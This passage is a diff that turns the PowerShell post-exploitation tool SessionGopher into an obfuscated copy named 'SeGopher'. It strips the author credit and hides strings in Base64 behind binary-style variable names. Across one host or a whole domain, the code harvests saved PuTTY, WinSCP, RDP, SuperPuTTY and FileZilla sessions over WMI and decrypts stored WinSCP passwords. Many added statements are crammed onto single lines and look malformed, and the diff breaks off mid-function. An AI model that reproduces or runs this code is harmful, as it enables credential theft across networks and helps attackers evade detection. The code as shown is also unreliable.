@@ -1,896 +1,510 @@
-
-function cachet {
-  param (
-      [switch]$o, # Generate CSV output
-      [switch]$hdPXEKUQjxCYg9C, # Searches entire filesystem for certain file extensions
-      [string]$u, # Domain\username (e.g. superduper.com\a-jerry)
-      [string]$p, # Password of domain account
-      [string]$iL, # A file of hosts to run SessionGopher against remotely, each host separated by a newline in the file
-      [string]$p9REFRiCCsuC9In, # If you want to run SessionGopher against one specific host
-      [switch]$qMELeoMyJPUTJQY # Run across all active directory
-  )
-
-  Write-Output '
-          o_       
-         /  ".   SessionGopher
-       ,"  _-"      
-     ,"   m m         
-  ..+     )      Brandon Arvanaghi
-     `m..m       Twitter: @arvanaghi | arvanaghi.com
-  '
-
+function SeGopher { param ( [switch]$o, [switch]$Thorough, [string]$u, [string]$p, [string]$iL, [string]$Target, [switch]$AllDomain ) echo 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAgACAAIAAgACAAIAAgACAAIAAgAG8AXwAgACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAALwAgACAAIgAuACAAIAAgAAoAIAAgACAAIAAgACAAIAAsACIAIAAgAF8ALQAiACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACwAIgAgACAAIABtACAAbQAgACAAIAAgACAAIAAgACAAIAAKACAAIAAuAC4AKwAgACAAIAAgACAAKQAgACAAIAAgACAAIAAKACAAIAAgACAAIABgAG0ALgAuAG0AIAAgACAAIAAgACAAIAAKACAAIAA='))) 
   if ($o) {
-    $zPRwy9FdrtsVRzg = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
-    New-Item -ItemType Directory $zPRwy9FdrtsVRzg | Out-Null
-    New-Item ($zPRwy9FdrtsVRzg + "\PuTTY.csv") -Type File | Out-Null
-    New-Item ($zPRwy9FdrtsVRzg + "\SuperPuTTY.csv") -Type File | Out-Null
-    New-Item ($zPRwy9FdrtsVRzg + "\WinSCP.csv") -Type File | Out-Null
-    New-Item ($zPRwy9FdrtsVRzg + "\FileZilla.csv") -Type File | Out-Null
-    New-Item ($zPRwy9FdrtsVRzg + "\RDP.csv") -Type File | Out-Null
-    if ($hdPXEKUQjxCYg9C) {
-        New-Item ($zPRwy9FdrtsVRzg + "\PuTTY ppk Files.csv") -Type File | Out-Null
-        New-Item ($zPRwy9FdrtsVRzg + "\Microsoft rdp Files.csv") -Type File | Out-Null
-        New-Item ($zPRwy9FdrtsVRzg + "\RSA sdtid Files.csv") -Type File | Out-Null
+    ${10101001001011011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AdABlAHIAIAAoAA=='))) + (Get-Date -Format 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIAC4AbQBtAC4AcwBzAA==')))) + ")" ni -ItemType Directory ${10101001001011011} | Out-Null ni 
+    (${10101001001011011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -Type File | Out-Null ni (${10101001001011011} 
+    + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHUAcABlAHIAUAB1AFQAVABZAC4AYwBzAHYA')))) -Type File | Out-Null ni (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -Type File | Out-Null ni (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABGAGkAbABlAFoAaQBsAGwAYQAuAGMAcwB2AA==')))) -Type File | Out-Null ni (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -Type File | Out-Null if ($Thorough) {
+        ni (${10101001001011011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -Type File | 
+        Out-Null ni (${10101001001011011} + 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -Type File | Out-Null ni 
+        (${10101001001011011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -Type File | 
+        Out-Null
     }
   }
-
-  if ($u -and $p) {
-    $fGXVxzAmP9cBYAr = ConvertTo-SecureString $p -AsPlainText -Force
-    $nkgC9zQvHxAXTk9 = New-Object -Typename System.Management.Automation.PSCredential -ArgumentList $u, $fGXVxzAmP9cBYAr
+  if ($u -and $p) { ${_10001001010100011} = ConvertTo-SecureString $p -AsPlainText -Force ${00011111000001000} = New-Object -Typename System.Management.Automation.PSCredential 
+    -ArgumentList $u, ${_10001001010100011}
   }
-
-
-  $HKU = 2147483651
-
-  $HKLM = 2147483650
-
-  $YmFMtBsKII9ePhI = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
-  $hUAQiRXSTz9NfCo = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
-  $9JUuYMtpnTYQPMX = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"
-
-  if ($iL -or $qMELeoMyJPUTJQY -or $p9REFRiCCsuC9In) {
-
-
-    $h99rpPyBhW9OYpp = ""
-
-    if ($qMELeoMyJPUTJQY) {
-      $h99rpPyBhW9OYpp = antivirals
-    } elseif ($iL) { 
-      $h99rpPyBhW9OYpp = Get-Content ((Resolve-Path $iL).Path)
-    } elseif ($p9REFRiCCsuC9In) {
-      $h99rpPyBhW9OYpp = $p9REFRiCCsuC9In
+  ${10001011100100010} = 2147483651 ${10010111110111111} = 2147483650 ${10011100110100100} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABTAGkAbQBvAG4AVABhAHQAaABhAG0AXABQAHUAVABUAFkAXABTAGUAcwBzAGkAbwBuAHMA'))) 
+  ${10010001010111000} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABNAGEAcgB0AGkAbgAgAFAAcgBpAGsAcgB5AGwAXABXAGkAbgBTAEMAUAAgADIAXABTAGUAcwBzAGkAbwBuAHMA'))) 
+  ${10100100000100110} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABTAGUAcgB2AGUAcgBzAA=='))) 
+  if ($iL -or $AllDomain -or $Target) {
+    ${00011001111000110} = "" if ($AllDomain) { ${00011001111000110} = _01000111000111100
+    } elseif ($iL) {
+      ${00011001111000110} = gc ((rvpa $iL).Path)
+    } elseif ($Target) {
+      ${00011001111000110} = $Target
     }
-
-    $OFQniJ9pBKnGEri = @{}
-    if ($nkgC9zQvHxAXTk9) {
-      $OFQniJ9pBKnGEri['Credential'] = $nkgC9zQvHxAXTk9
+    ${10111100110010001} = @{} if (${00011111000001000}) { 
+      ${10111100110010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = ${00011111000001000}
     }
-
-    foreach ($FihclsuUejmorCq in $h99rpPyBhW9OYpp) {
-
-      if ($qMELeoMyJPUTJQY) {
-
-        $FihclsuUejmorCq = $FihclsuUejmorCq.Properties.name
-        if (!$FihclsuUejmorCq) { Continue }
+    foreach (${10111101000001111} in ${00011001111000110}) { if ($AllDomain) { ${10111101000001111} = ${10111101000001111}.Properties.name if (!${10111101000001111}) { 
+        Continue }
       }
-
-      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
-      Write-Host "Digging on" $FihclsuUejmorCq"..."
-
-      $SIDS = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $HKU,'' -ComputerName $FihclsuUejmorCq @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
-
-      foreach ($SID in $SIDs) {
-
-
-        $ggLuBPimyiJwQuR = try { (Split-Path -Leaf (Split-Path -Leaf (beanbag))) } catch {}
-        $9dmptIQvAWIrBtO = (($FihclsuUejmorCq + "\" + $ggLuBPimyiJwQuR) -Join "")
-
-
-        $V9joSisJDLQPInP = New-Object PSObject
-
-
-        $syHqDrMywPTJprj = New-Object System.Collections.ArrayList
-        $muzrifeMsMRPGSl = New-Object System.Collections.ArrayList
-        $vPIjdrTXjYCbuew = New-Object System.Collections.ArrayList
-        $EpFdJVExPKHuYcZ = New-Object System.Collections.ArrayList
-        $d9zjC9MrnEqjuDK = New-Object System.Collections.ArrayList
-
-
-        $D9wMVfnzTcEYtoc = $SID + $9JUuYMtpnTYQPMX
-        $XDXyugGv9xkQpXo = $SID + $YmFMtBsKII9ePhI
-        $azNsPQOqGFMOGlD = $SID + $hUAQiRXSTz9NfCo
-        $tjXGnPGUodYIaQK = "Drive='C:' AND Path='\\Users\\$ggLuBPimyiJwQuR\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
-        $fiViRY9LioUR99p = "Drive='C:' AND Path='\\Users\\$ggLuBPimyiJwQuR\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
-
-        $9EbwhfRDpIAQa9B = Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$D9wMVfnzTcEYtoc @optionalCreds
-        $APKxJZkYQI9XGnA = Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$XDXyugGv9xkQpXo @optionalCreds
-        $nhpI9LbowuwdiBt = Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$azNsPQOqGFMOGlD @optionalCreds
-        $Kdi9ilat9ZJmRDb = (Get-WmiObject -Class 'CIM_DataFile' -Filter $tjXGnPGUodYIaQK -ComputerName $FihclsuUejmorCq @optionalCreds | Select Name)
-        $Gdvlx9HnRHgAfUb = (Get-WmiObject -Class 'CIM_DataFile' -Filter $fiViRY9LioUR99p -ComputerName $FihclsuUejmorCq @optionalCreds | Select Name)
-
-
-        if (($nhpI9LbowuwdiBt | Select-Object -ExpandPropert ReturnValue) -eq 0) {
-
-
-          $nhpI9LbowuwdiBt = $nhpI9LbowuwdiBt | Select-Object -ExpandProperty sNames
-          
-          foreach ($9lpDIZWRXPyjyAu in $nhpI9LbowuwdiBt) {
-      
-            $LCObjKFbkLskmuo = "" | Select-Object -Property Source,Session,Hostname,Username,Password
-            $LCObjKFbkLskmuo.Source = $9dmptIQvAWIrBtO
-            $LCObjKFbkLskmuo.Session = $9lpDIZWRXPyjyAu
-
-            $idyJQmxkauBOafr = $azNsPQOqGFMOGlD + "\" + $9lpDIZWRXPyjyAu
-
-            $LCObjKFbkLskmuo.Hostname = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"HostName" @optionalCreds).sValue
-            $LCObjKFbkLskmuo.Username = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"UserName" @optionalCreds).sValue
-            $LCObjKFbkLskmuo.Password = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"Password" @optionalCreds).sValue
-
-            if ($LCObjKFbkLskmuo.Password) {
-
-              $yGkWFOy99qz9HSM = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
-          
-              $Mw9zPDORgH99mYT = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$yGkWFOy99qz9HSM,"UseMasterPassword" @optionalCreds).uValue
-              
-              if (!$Mw9zPDORgH99mYT) {
-                  $LCObjKFbkLskmuo.Password = (DecryptWinSCPPassword $LCObjKFbkLskmuo.Hostname $LCObjKFbkLskmuo.Username $LCObjKFbkLskmuo.Password)
+      Write-Host -NoNewLine -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHIAawBHAHIAZQBlAG4A'))) 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA='))) Write-Host 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGcAZwBpAG4AZwAgAG8AbgA='))) ${10111101000001111}"..." ${10010000010101111} = Invoke-WmiMethod 
+      -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBLAGUAeQA='))) -ArgumentList ${10001011100100010},'' -ComputerName ${10111101000001111} 
+      @10111100110010001 | select -ExpandProperty sNames | ? {$_ -match 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwBcAGQAXAAtAF0AKwAkAA==')))} foreach (${01100000001101101} in 
+      ${10010000010101111}) {
+        ${00110101011111111} = try { (Split-Path -Leaf (Split-Path -Leaf (_01011000110111000))) } catch {} ${00111110011110111} = ((${10111101000001111} + "\" + 
+        ${00110101011111111}) -Join "") ${10000100110110100} = New-Object PSObject ${01111101100010010} = New-Object System.Collections.ArrayList ${01010111100000001} = 
+        New-Object System.Collections.ArrayList ${10001101110101001} = New-Object System.Collections.ArrayList ${10111100100011001} = New-Object System.Collections.ArrayList 
+        ${00010100001000100} = New-Object System.Collections.ArrayList ${10110000001101111} = ${01100000001101101} + ${10100100000100110} ${00011101000110001} = 
+        ${01100000001101101} + ${10011100110100100} ${01010110101100110} = ${01100000001101101} + ${10010001010111000} ${10001010011100011} = 
+        $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAD0AJwBDADoAJwAgAEEATgBEACAAUABhAHQAaAA9ACcAXABcAFUAcwBlAHIAcwBcAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwAXABEAG8AYwB1AG0AZQBuAHQAcwBcAFwAUwB1AHAAZQByAFAAdQBUAFQAWQBcAFwAJwAgAEEATgBEACAARgBpAGwAZQBOAGEAbQBlAD0AJwBTAGUAcwBzAGkAbwBuAHMAJwAgAEEATgBEACAARQB4AHQAZQBuAHMAaQBvAG4APQAnAFgATQBMACcA'))) 
+        ${01111101101100101} = 
+        $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAD0AJwBDADoAJwAgAEEATgBEACAAUABhAHQAaAA9ACcAXABcAFUAcwBlAHIAcwBcAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwAXABBAHAAcABEAGEAdABhAFwAXABSAG8AYQBtAGkAbgBnAFwAXABGAGkAbABlAFoAaQBsAGwAYQBcAFwAJwAgAEEATgBEACAARgBpAGwAZQBOAGEAbQBlAD0AJwBzAGkAdABlAG0AYQBuAGEAZwBlAHIAJwAgAEEATgBEACAARQB4AHQAZQBuAHMAaQBvAG4APQAnAFgATQBMACcA'))) 
+        ${10101001000001110} = Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList 
+        ${10001011100100010},${10110000001101111} @10111100110010001 ${10101100111011001} = Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList 
+        ${10001011100100010},${00011101000110001} @10111100110010001 ${01010010010001110} = Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList 
+        ${10001011100100010},${01010110101100110} @10111100110010001 ${10000011010100100} = (gwmi -Class 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter ${10001010011100011} -ComputerName ${10111101000001111} 
+        @10111100110010001 | Select Name) ${01011001010011001} = (gwmi -Class 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter ${01111101101100101} -ComputerName ${10111101000001111} 
+        @10111100110010001 | Select Name) if ((${01010010010001110} | select -ExpandPropert ReturnValue) -eq 0) {
+          ${01010010010001110} = ${01010010010001110} | select -ExpandProperty sNames foreach (${00110111001000101} in ${01010010010001110}) { ${10101000000111100} = "" | 
+            select -Property Source,Session,Hostname,Username,Password ${10101000000111100}.Source = ${00111110011110111} ${10101000000111100}.Session = ${00110111001000101} 
+            ${01100011110101111} = ${01010110101100110} + "\" + ${00110111001000101} ${10101000000111100}.Hostname = (Invoke-WmiMethod -ComputerName ${10111101000001111} 
+            -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList 
+            ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) @10111100110010001).sValue 
+            ${10101000000111100}.Username = (Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList 
+            ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) @10111100110010001).sValue 
+            ${10101000000111100}.Password = (Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList 
+            ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) @10111100110010001).sValue 
+            if (${10101000000111100}.Password) {
+              ${01000101111100100} = ${01100000001101101} + 
+              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAG8AZgB0AHcAYQByAGUAXABNAGEAcgB0AGkAbgAgAFAAcgBpAGsAcgB5AGwAXABXAGkAbgBTAEMAUAAgADIAXABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuAFwAUwBlAGMAdQByAGkAdAB5AA=='))) 
+              ${10110011010010011} = (Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
+              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetDWordValue -ArgumentList 
+              ${10001011100100010},${01000101111100100},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUATQBhAHMAdABlAHIAUABhAHMAcwB3AG8AcgBkAA=='))) 
+              @10111100110010001).uValue if (!${10110011010010011}) {
+                  ${10101000000111100}.Password = (_00111011011010000 ${10101000000111100}.Hostname ${10101000000111100}.Username ${10101000000111100}.Password)
               } else {
-                  $LCObjKFbkLskmuo.Password = "Saved in session, but master password prevents plaintext recovery"
+                  ${10101000000111100}.Password = 
+                  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAHYAZQBkACAAaQBuACAAcwBlAHMAcwBpAG8AbgAsACAAYgB1AHQAIABtAGEAcwB0AGUAcgAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBlAHYAZQBuAHQAcwAgAHAAbABhAGkAbgB0AGUAeAB0ACAAcgBlAGMAbwB2AGUAcgB5AA==')))
               }
-
             }
-             
-            [void]$d9zjC9MrnEqjuDK.Add($LCObjKFbkLskmuo)
-      
-          } # For Each WinSCP Session
-
-          if ($d9zjC9MrnEqjuDK.count -gt 0) {
-
-            $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $d9zjC9MrnEqjuDK
-
-            if ($o) {
-              $d9zjC9MrnEqjuDK | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\WinSCP.csv") -NoTypeInformation
+            [void]${00010100001000100}.Add(${10101000000111100})
+          } 
+          if (${00010100001000100}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${00010100001000100} if ($o) {
+              ${00010100001000100} | select * | Export-CSV -Append -Path (${10101001001011011} + 
+              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -NoTypeInformation
             } else {
-              Write-Output "WinSCP Sessions"
-              $d9zjC9MrnEqjuDK | Select-Object * | Format-List | Out-String
+              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) ${00010100001000100} | select * | fl | 
+              Out-String
             }
-
           }
-        
-        } # If path to WinSCP exists
-
-        if (($APKxJZkYQI9XGnA | Select-Object -ExpandPropert ReturnValue) -eq 0) {
-
-
-          $APKxJZkYQI9XGnA = $APKxJZkYQI9XGnA | Select-Object -ExpandProperty sNames
-
-          foreach ($sdwTIAlDSEvGFMv in $APKxJZkYQI9XGnA) {
-      
-            $GoBWdZjNHqxctqm = "" | Select-Object -Property Source,Session,Hostname
-
-            $idyJQmxkauBOafr = $XDXyugGv9xkQpXo + "\" + $sdwTIAlDSEvGFMv
-
-            $GoBWdZjNHqxctqm.Source = $9dmptIQvAWIrBtO
-            $GoBWdZjNHqxctqm.Session = $sdwTIAlDSEvGFMv
-            $GoBWdZjNHqxctqm.Hostname = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"HostName" @optionalCreds).sValue
-             
-            [void]$syHqDrMywPTJprj.Add($GoBWdZjNHqxctqm)
-      
+        } 
+        if ((${10101100111011001} | select -ExpandPropert ReturnValue) -eq 0) { ${10101100111011001} = ${10101100111011001} | select -ExpandProperty sNames foreach 
+          (${00000011011100001} in ${10101100111011001}) {
+            ${00001111000011010} = "" | select -Property Source,Session,Hostname ${01100011110101111} = ${00011101000110001} + "\" + ${00000011011100001} 
+            ${00001111000011010}.Source = ${00111110011110111} ${00001111000011010}.Session = ${00000011011100001} ${00001111000011010}.Hostname = (Invoke-WmiMethod 
+            -ComputerName ${10111101000001111} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue 
+            -ArgumentList ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) 
+            @10111100110010001).sValue [void]${01111101100010010}.Add(${00001111000011010})
           }
-
-          if ($syHqDrMywPTJprj.count -gt 0) {
-
-            $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $syHqDrMywPTJprj
-
-            if ($o) {
-              $syHqDrMywPTJprj | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY.csv") -NoTypeInformation
+          if (${01111101100010010}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) -Value ${01111101100010010} if ($o) {
+              ${01111101100010010} | select * | Export-CSV -Append -Path (${10101001001011011} + 
+              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -NoTypeInformation
             } else {
-              Write-Output "PuTTY Sessions"
-              $syHqDrMywPTJprj | Select-Object * | Format-List | Out-String
+              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) ${01111101100010010} | select * | fl | 
+              Out-String
             }
-
           }
-
-        } # If PuTTY session exists
-
-        if (($9EbwhfRDpIAQa9B | Select-Object -ExpandPropert ReturnValue) -eq 0) {
-
-
-          $9EbwhfRDpIAQa9B = $9EbwhfRDpIAQa9B | Select-Object -ExpandProperty sNames
-
-          foreach ($VrHcV9Yvshxrdeu in $9EbwhfRDpIAQa9B) {
-      
-            $9RiJbwhgKbl9CtD = "" | Select-Object -Property Source,Hostname,Username
-            
-            $idyJQmxkauBOafr = $D9wMVfnzTcEYtoc + "\" + $VrHcV9Yvshxrdeu
-
-            $9RiJbwhgKbl9CtD.Source = $9dmptIQvAWIrBtO
-            $9RiJbwhgKbl9CtD.Hostname = $VrHcV9Yvshxrdeu
-            $9RiJbwhgKbl9CtD.Username = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"UserNameHint" @optionalCreds).sValue
-
-            [void]$vPIjdrTXjYCbuew.Add($9RiJbwhgKbl9CtD)
-      
+        } 
+        if ((${10101001000001110} | select -ExpandPropert ReturnValue) -eq 0) { ${10101001000001110} = ${10101001000001110} | select -ExpandProperty sNames foreach 
+          (${01110100101010111} in ${10101001000001110}) {
+            ${00011010011111100} = "" | select -Property Source,Hostname,Username ${01100011110101111} = ${10110000001101111} + "\" + ${01110100101010111} 
+            ${00011010011111100}.Source = ${00111110011110111} ${00011010011111100}.Hostname = ${01110100101010111} ${00011010011111100}.Username = (Invoke-WmiMethod 
+            -ComputerName ${10111101000001111} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue 
+            -ArgumentList ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAEgAaQBuAHQA'))) 
+            @10111100110010001).sValue [void]${10001101110101001}.Add(${00011010011111100})
           }
-
-          if ($vPIjdrTXjYCbuew.count -gt 0) {
-
-            $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $vPIjdrTXjYCbuew
-
-            if ($o) {
-              $vPIjdrTXjYCbuew | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RDP.csv") -NoTypeInformation
+          if (${10001101110101001}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${10001101110101001} if ($o) {
+              ${10001101110101001} | select * | Export-CSV -Append -Path (${10101001001011011} + 
+              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -NoTypeInformation
             } else {
-              Write-Output "Microsoft RDP Sessions"
-              $vPIjdrTXjYCbuew | Select-Object * | Format-List | Out-String
+              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAFMAZQBzAHMAaQBvAG4AcwA='))) ${10001101110101001} | 
+              select * | fl | Out-String
             }
-
           }
-
-        } # If RDP sessions exist
-
-
-        if ($Kdi9ilat9ZJmRDb.Name) {
-
-          $File = "C:\Users\$ggLuBPimyiJwQuR\Documents\SuperPuTTY\Sessions.xml"
-          $RHVgAfc9LXVCzZd = DownloadAndExtractFromRemoteRegistry $File
-
-          [xml]$VhtJEeNXNsVmvvQ = $RHVgAfc9LXVCzZd
-          (ProcessSuperPuTTYFile $VhtJEeNXNsVmvvQ)
-
+        } 
+        if (${10000011010100100}.Name) { ${_01011100110011110} = 
+          $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwARABvAGMAdQBtAGUAbgB0AHMAXABTAHUAcABlAHIAUAB1AFQAVABZAFwAUwBlAHMAcwBpAG8AbgBzAC4AeABtAGwA'))) 
+          ${01100111110001000} = _10000010000000010 ${_01011100110011110} [xml]${_10100100011100010} = ${01100111110001000} (_01110101110100101 ${_10100100011100010})
         }
-
-
-        if ($Gdvlx9HnRHgAfUb.Name) {
-
-          $File = "C:\Users\$ggLuBPimyiJwQuR\AppData\Roaming\FileZilla\sitemanager.xml"
-          $RHVgAfc9LXVCzZd = DownloadAndExtractFromRemoteRegistry $File
-
-          [xml]$DnZtKlK9NayrWx9 = $RHVgAfc9LXVCzZd
-          (ProcessFileZillaFile $DnZtKlK9NayrWx9)
-
-        } # FileZilla
-
-      } # for each SID
-
